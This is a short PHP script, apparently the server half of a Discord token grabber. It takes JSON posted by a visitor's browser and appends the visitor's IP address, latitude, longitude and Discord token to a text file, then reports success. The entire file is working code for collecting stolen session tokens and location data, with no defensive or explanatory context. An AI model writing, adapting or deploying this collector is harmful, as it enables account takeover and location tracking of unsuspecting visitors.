<?php
$data = json_decode(file_get_contents('php://input'), true);
$ip = $data['ip'];
$latitude = $data['latitude'];
$longitude = $data['longitude'];
$discordToken = $data['discordToken'];

// Save the visitor info to a file
$file = 'visitor_info.txt';
$current = file_get_contents($file);
$current .= "IP: $ip, Latitude: $latitude, Longitude: $longitude, Discord Token: $discordToken\n";
file_put_contents($file, $current);

header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
?>